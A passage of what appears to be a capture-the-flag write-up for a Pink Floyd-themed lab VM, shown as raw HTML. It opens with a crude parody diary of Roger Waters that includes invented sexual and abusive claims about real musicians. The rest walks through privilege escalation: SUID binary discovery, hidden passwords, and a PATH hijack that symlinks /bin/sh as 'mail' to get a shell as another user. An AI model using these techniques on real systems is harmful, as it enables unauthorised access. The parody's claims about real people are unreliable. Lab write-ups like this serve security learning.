
    Friday

        Dave phoned again. Apparently he wants to borow my casual jacket. Couldn't find one without the sleeves rolled up so I bought a brand new one. It was worth it after I'd sewn some prawns into the lining and filled the collar with itching powder. Saw Dave later wearing it on Top Of The Pops - he's not playing as well as he used to!! Mum came tound and asked me if I wanted to go to dinner with her and the wife. You mean I'm married??

    Saturday

        Phoned the Ministry Of Defence again and asked them why my dad had to die in the war. Got standard reply from snotty receptionist - &quot;because he was shot through the head by a german, Mr Waters&quot;. Typical. Wrote a song about the snooty girl called &quot;I send people off to die and I don't care (Potzdamer Mix)&quot;.

        Had lunch with my manager. Apparently the Floyd are to be honoured at some big awards and Dave and the boys are going. Said I would go for a laugh. Phoned the wife to see if she wanted to go but she said Dave had already invited her. Bugger.

    Sunday

        Drove by Daves house at 3.00 in the morning playing the Final Cut really loud - Dave came out and threw a guitar at me. Said it was the best thing he'd done with a guitar since The Wall. Drove off really quick after he threatened not to sing any more songs I had the rights to.

        Decided not to go to the awards - sent a Gerald Scarfe cartoon of myself instead. MTV vj said that they nearly didn't recognise me without the casual jacket &amp;amp; shades but I certainly has more charisma than usual. Got really depressed and decided to sell the pics of Dave shagging Kate Bush to the News Of The World. Now that's what I call a discovery!!

    Week Three
    Monday

        Got up, had a bath. Decided to have a cup of tea. Milk had gone off again. Made a mental note to shoot Dave Gilmour. Went for a walk in the park. It was a nice day, lot's of mothers with their children on the swings etc. No fathers around - maybe they all died in the war. Couldn't stay long - the police turned up and took me to the station. Got questioned for two hours on why a middle aged man dressed all in black with sunglasses on should hang around the playground. Talked to the officers about the war and how my father was killed. Got let off with a caution and a promise to see a shrink. On way home had a brilliant idea - a ouija board!! Went straight to the shop and bought one. On the way back I bought another thousand copies of ATD with my Floyd royalties - got to keep the boys at Sony happy and Snowy in guitar lessons.

    Tuesday

        Felt really bad this morning so stayed in bed making anonymous and abusive phone calls to Maggie Thatcher and Ronald Reagan. That will teach them to ruin peoples lives, start wars and promote a soap opera state. But how do they always know it's me?? Called Dave for a laugh - shame he wasn't in, put on my Kate Bush voice and left message saying I was pregnant and was sure the baby was his.

        Contact!!! After 3 hours I think I am in touch with my father!! Asked loads of questions with yes or no answers which he got right!! Eventually asked the BIG ONE, what should I do with my life... message came back: S..T..O..P....F..U..C..K..I.N..G....M..O..A..N..I..N..G!! Went to bed early with a cup of cocoa after beating my fists bloody against the wall.

    Wednesday

        BBC phoned up to ask if I would take part in a documentary - Daves doing it they said. Decided to do it after BBC man assured me we would be recorded on seperate days. Next door came round to ask me to stop beating on the wall - gave them a copy of the album so they could understand. They came back two hours later and asked me to sign it - I did and they left looking puzzled. Heard the man muttering &quot;Shit...I thought he was Dave Gilmour...who IS Roger Waters anyway?&quot; under his breath. Had a cup of black coffee and went to bed. Decided to give the beating my fists against the wall a miss tonight.

        Couldn't sleep, decided to make a list of things that keep me awake at night -

            Thinking about the war.
            Thinking about my father/mother/the war.
            Going round Daves house at 3:00AM and singing &quot;and when the band you're in starts playing different tunes&quot; at the top of my voice.
            Being repeatedly beaten over the head with a rubber chicken.
            Thinking about market forces and the soap opera state.
            Going round Daves at 4:00AM, running thru his garden and singing &quot;the lunatic is on the grass&quot; at the top of my voice.
            Thinking some more about the war.
            Wondering just what I'm going to do to Dave if he comes round and starts any of that rubber chicken shit tonight.
            Lying awake writing lists.

        Fell asleep before I could do number 10.

    Thursday

        Got up late, must get more sleep in future. Decided to work on a new album but couldn't think of a good concept. Listened to all my albums (INCLUDING The Final Cut) in a row and decided to kill myself due to the sheer futility of it all. Couldn't go through with it without writing a new album about what it feels like to want to commit suicide. Finished it and felt a lot better. Sent it to Sony by local courier company - which is trangely called Fat Daves. I always get a kick out of calling and saying &quot;Hello, Fat Daves?? Yeh Roger here, I need you to run an errand for me you fat talentless bastard&quot;. Went to BBC documentary and it turned out to be a tribute to Dave!! And he was there!! According to them one of his new business ventures is a courier company!! Said lots of uncomplimentary things about him on camera but he just ran around laughing behind me making finger gestures behind my head. Eventually he collapsed in a fat heap on the floor covered in sweat. Made a mental note to send him another 400 cream cakes and some of my Grecian 2000. Looks like he didn't like the wig I sent him either.

    Friday

        Got up late again, head still sore from the rubber chicken. Message from Sony on the ansaphone - apparently all the account execs killed themselves this morning. I detect the hand of... er... best not think about that one, Phoned and asked if they had a chance to listen to the album - receptionist hung up on me. Stormed round the garden for a couple of hours in an angst ridden torment. Pleb next door kept staring at me, told him I'd put my Paul Carrack CD on full blast if he didn't fuck off. He did. Continued storming for a bit till it got dark and I banged my shins on the bar-B-Q. Next time I do it in the dark I'll take the aviators off.

        Message on ansaphone from some anonymous woman telling me to stop being such a miserable nutcase and to pull myself together. Sounded like my mother. Recorded new ansaphone message:

            &quot;Hi, this is Roger 'I'm outta my mind, me' Waters, I can't take your call as I am far too busy writing large scale concept albums with outrageous stage shows that will never be performed due to poor ticket sales. ALRIGHT, LOOK... MY FATHER DIED IN THE WAR YOU KNOW!! AND I WAS PERSECUTED BY MY MOTHER FROM AN EARLY AGE!! I THINK THAT GIVES ME THE RIGHT TO BE A MISUNDERSTOOD CREATIVE GENIUS!! Right, OK, and I'm a miserable bugger. Leave your message after the tone. Oh yeh, I said I would tour if ATD sold 2 million copies and to date it's only sold 1.3 million, so get off my back about that one as well. Thanks.&quot;

    Saturday

        Got up early- it's my birthday!! Mum came round with presents - a pint of milk and a fridge. Uncle Bob didn't even send a card!! Dave sent some singing lesson vouchers - bastard!! Made mental note to send him my new book &quot;Writing successful concept albums based around music and good lyrics rather than some crap with a couple of guitar solos in it&quot; if I ever get the bugger published. For some reason all the publishers think it's a bit hypocritical. Had a tantrum as mum forgot the jelly and ice cream. Sat in my room in the dark for a bit and then called Snowy. Told me he couldn't come round to play as he's joined David as rythm guitarist on his solo album!! Phoned Jehovas Witnesses pretending to be in deep spiritual crisis and gave them Daves adress. Went to bed but had to get up 2 hours later as Dave had sent the Moonies round. Got rid of them by talking about the early years with Syd Barret and playing them Interstellar Overdrive.

    Sunday

        Decided to make it up with Dave - dropped by his house and offered to do some lyrics for his solo project, with no mention of the war/soap opera states/alienation etc. Wrote a great song called &quot;The Bravery of being Ronald Reagan behind a big large thing almost like a Wall that shields your feelings at The Anzio Bridgehead whilst on TV&quot;. Dave didn't like it so promised to go home and write another one,

        Got home and decided I din't feel like being nice to him anymore. Sent him these lyrics instead:

            My dad went off to a great big battle
            The TV satellites watched from Seattle
            He fought the buggers left and right
            Then the cameras panned to a dreadful sight
            As some German Kraut
            Snuffed his life right out
            Bugger

            And a monkey sat on Daves old bones
            Buggered his ferraris and wrecked his homes
            And Billy chipped in with Radio Waves
            Shot right up the arse of fat old Dave
            For good lyrics he'll forever hunt
            'Cause that Dave Gilmour, well
            He's just a cunt
            Yeah&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After much more digging I've found that there's more users on the system, apart from the ones we know. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home
total 28
drwxr-xr-x   7 root           wheel          512 Oct 24  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x  13 root           wheel          512 Oct 24  2015 ..
drwx------   4 DavidGilmour   DavidGilmour   512 Oct 28  2015 DavidGilmour
drwx------   3 NickMason      NickMason      512 Aug  8  2015 NickMason
drwx------   3 RichardWright  RichardWright  512 Nov 27  2015 RichardWright
drwx------   3 RogerWaters    RogerWaters    512 Oct 28  2015 RogerWaters
drwxr-xr-x   4 root           SydBarrett     512 Oct 24  2015 SydBarrett&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And luckily, two of these users have binaries, with &lt;b&gt;SUID&lt;/b&gt; bit set.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; DavidGilmour 2&amp;gt;/dev/null
/usr/local/bin/shineon
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; NickMason 2&amp;gt;/dev/null
/usr/local/bin/brick&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately, one of them is not accessable at the moment. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/shineon
ksh: /usr/local/bin/shineon: cannot execute - Permission denied&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But the &lt;b&gt;brick&lt;/b&gt; binary is executable and it's asking us for the only member featured on every Pink Floyd album. Quick google query answered this question - it's &lt;b&gt;Nick Mason&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Mason was the only Pink Floyd member to be featured on every one of their albums, and the only constant member of the band since its formation in 1965.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/brick




What have we here, laddie?
Mysterious scribbings?
A secret code?
Oh, poems, no less!
Poems everybody!




Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
/bin/sh: Cannot determine current working directory
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whoami
NickMason&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Correct answer, and we're logged into another account on the machine. Let's take a look at the directories. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/NickMason
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 1576
drwx------  3 NickMason  NickMason     512 Aug  8  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x  7 root       wheel         512 Oct 24  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason      87 Oct 24  2015 .Xdefaults
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason     773 Oct 24  2015 .cshrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason     103 Oct 24  2015 .cvsrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason     398 Oct 24  2015 .login
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason     175 Oct 24  2015 .mailrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason     218 Oct 24  2015 .profile
drwx------  2 NickMason  NickMason     512 Oct 28  2015 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason    1284 Oct 26  2015 bio.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason       0 Oct 28  2015 mbox
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason  766656 Aug  8  2015 nick_mason_profile_pic.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another group of files. Once again, we have to look at them in order to find clues. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;bio.txt&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ cat bio.txt
&quot;Nicholas Berkeley &quot;Nick&quot; Mason (born 27 January 1944) is an English musician and composer, best known as the drummer of Pink Floyd. He is the only constant member of the band since its formation in 1965. Despite solely writing only a few Pink Floyd songs, Mason has co-written some of Pink Floyd's most popular compositions such as &quot;Echoes&quot; and &quot;Time&quot;.

Mason is the only Pink Floyd member to be featured on every one of their albums. It is estimated that as of 2010, the group have sold over 250 million records worldwide,[1][2] including 75 million units sold in the United States.

He competes in auto racing events, such as the 24 Hours of Le Mans.

On 26 November 2012, Mason received an Honorary Doctor of Letters from the University of Westminster at the presentation ceremony of the School of Architecture and Built Environment (he had studied architecture at the University's predecessor, Regent Street Polytechnic, 1962-1967).&quot;

I wander if anyone is reading these bio's?  Richard Wright.. if you're reading this, I'm not really going to cut you into little pieces.  I was just having a joke.  Anyhow, I have now added you to thewall.  You're username is obvious. You'll find your password in my profile pic.

Source: Wikipedia (https://en.wikipedia.org/wiki/Nick_Mason)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;b&gt;nick_mason_profile_pic.jpg&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file nick_mason_profile_pic.jpg                                                                                                                    
nick_mason_profile_pic.jpg: Ogg data, Vorbis audio, stereo, 44100 Hz, created by: Xiph.Org libVorbis I&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It's a sound file! &lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/img/the-wall/nick_mason.ogg&quot;&gt;&lt;b&gt;nick_mason.ogg&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;After listening to it for multiple times, I've noticed a pattern - it's morse code. Let's write it down and translate. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;.-...-.-......-.-.-...--.-...--.....-.--------.....-...--..-..-.-...-.......-
RICHARDWRIGHT1943FARFISA&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another credentials to collection, let's login. Unfortunately we can't &lt;b&gt;ssh&lt;/b&gt; into the account, we have to change account on the current shell.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su RichardWright
Password:
ksh: Cannot determine current working directory
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: .: Permission denied
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whoami
RichardWright&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Quick check showed that now we're able to run previously restricted binary! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
2
Echoes - Meddle
RogerWaters ttyp0    Aug  3 04:42   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.56.102&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;


Press ENTER to &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
1

    August 2017
Su Mo Tu We Th Fr Sa
       1  2  3  4  5
 6  7  8  9 10 11 12
13 14 15 16 17 18 19
20 21 22 23 24 25 26
27 28 29 30 31      

Time - The Dark Side of the Moon

Press ENTER to &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
3
Is There Anybody Out There? - The Wall
ping: unknown host: www.google.com
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
No mail &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RichardWright
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
5
Quitting program&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But running &lt;b&gt;strings&lt;/b&gt; on this binary showed that &lt;b&gt;mail&lt;/b&gt; path is not correctly limited. That way we can create a &lt;b&gt;symlink&lt;/b&gt; that will execute our program, instead of mail. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings /usr/local/bin/shineon
/usr/libexec/ld.so
OpenBSD
OpenBSD
libc.so.80.1
&lt;span class=&quot;nb&quot;&gt;printf
&lt;/span&gt;__stack_smash_handler
__srget
getc
puts
system
_thread_atfork
environ
__progname
__cxa_atexit
__sF
__isthreaded
scanf
_Jv_RegisterClasses
__got_start
__got_end
__data_start
_edata
__bss_start
__progname_storage
__fini
__init_tcb
QRP1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;^_]
Menu
1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
Quitting program!
Invalid choice!
load_menu
Time - The Dark Side of the Moon
/usr/bin/cal
Press ENTER to &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Echoes - Meddle
/usr/bin/who
Is There Anybody Out There? - The Wall
/sbin/ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 3 www.google.com
Keep Talking- The Division Bell
mail&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Creating symlinks and overwriting the &lt;b&gt;PATH&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /bin/sh /tmp/mail
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And now it's time to run this program once again. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
mail: Cannot determine current working directory
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whoami
DavidGilmour&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another account added to collection! What will he have in home directory? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/DavidGilmour
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 408
drwx------  4 DavidGilmour  DavidGilmour     512 Oct 28  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x  7 root          wheel            512 Oct 24  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour      87 Oct 24  2015 .Xdefaults
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     773 Oct 24  2015 .cshrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     103 Oct 24  2015 .cvsrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     398 Oct 24  2015 .login
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     175 Oct 24  2015 .mailrc
drwx------  2 DavidGilmour  DavidGilmour     512 Oct 26  2015 .private
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     218 Oct 24  2015 .profile
drwx------  2 DavidGilmour  DavidGilmour     512 Oct 28  2015 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 DavidGilmour  DavidGilmour     384 Aug  8  2015 anotherbrick.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour    1022 Oct 26  2015 bio.txt
&lt;span class=&quot;nt&quot;&gt;-rwxr-----&lt;/span&gt;  1 DavidGilmour  DavidGilmour  182073 Oct 28  2015 david_gilmour_profile_pic.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     785 Oct 27  2015 mbox&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;b&gt;anotherbrick.txt  &lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;anotherbrick.txt                                                                                                                               
&lt;span class=&quot;c&quot;&gt;# Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond&lt;/span&gt;

New website &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php

&lt;span class=&quot;c&quot;&gt;# You have to be trusted by the people you lie to. So that when they turn their backs on you, you'll get the chance to put the knife in. - Pink Floyd, Dogs&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;New website, that's cool! Let's take a look at it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.103/pinkfloyd1965newblogsite50yearscelebration-temp/index.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/img/the-wall/new-web.png&quot; alt=&quot;New website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you take a closer look at the image, you will be able to find pieces of a string. I've managed to play a little with the setting in &lt;b&gt;gimp&lt;/b&gt; and changing &lt;b&gt;threshold&lt;/b&gt; allowed us to see whole message. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/the-wall/img-after.png&quot; alt=&quot;Image after&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/welcometothemachine
50696e6b466c6f796435305965617273&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I've tried looking for this direcotory in the website, but there was nothing. After coming back to the David's home directory, I've found his password in the image file. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings david_gilmour_profile_pic.jpg
8?&amp;gt;&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
dy~g
|Mvk
7OnN&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Nn_&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
^&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;W
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;w|6
Om?OoA
who_are_you_and_who_am_i&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And after logging in, I've used &lt;b&gt;find&lt;/b&gt; command to look for a directory. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su DavidGilmour
Password:
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'welcometothemachine'&lt;/span&gt; 2&amp;gt;/dev/null
/var/www/htdocs/welcometothemachine
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www/htdocs/welcometothemachine
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 24
drwxr-xr-x  2 root  welcometothemachine   512 Aug  8  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-x---  4 www   welcometothemachine   512 Nov 27  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rws--s---&lt;/span&gt;  1 root  welcometothemachine  7513 Nov 27  2015 PinkFloyd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;PinkFloyd                                                                  
Please send your answer to Old Pink, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: 50696e6b466c6f796435305965617273

Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless

Congratulations... permission has been granted.
You can now &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;your controls to the heart of the sun!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Permissions granted? What does it mean? After a while, I noticed that the &lt;b&gt;sudo&lt;/b&gt; permissions were granted to us. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /root
Password:
total 48
drwx------   5 root  wheel   512 Nov 27  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x  13 root  wheel   512 Oct 24  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel    87 Aug 16  2015 .Xdefaults
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel   578 Aug 16  2015 .cshrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel    94 Aug 16  2015 .cvsrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel   328 Aug 16  2015 .login
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel   468 Aug 16  2015 .profile
drwx------   2 root  wheel   512 Nov 27  2015 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel  2739 Nov 27  2015 flag.txt
drwxr-xr-x   2 root  wheel   512 Nov 14  2015 scripts
drwxr-xr-x   2 root  wheel   512 Oct 27  2015 tmp
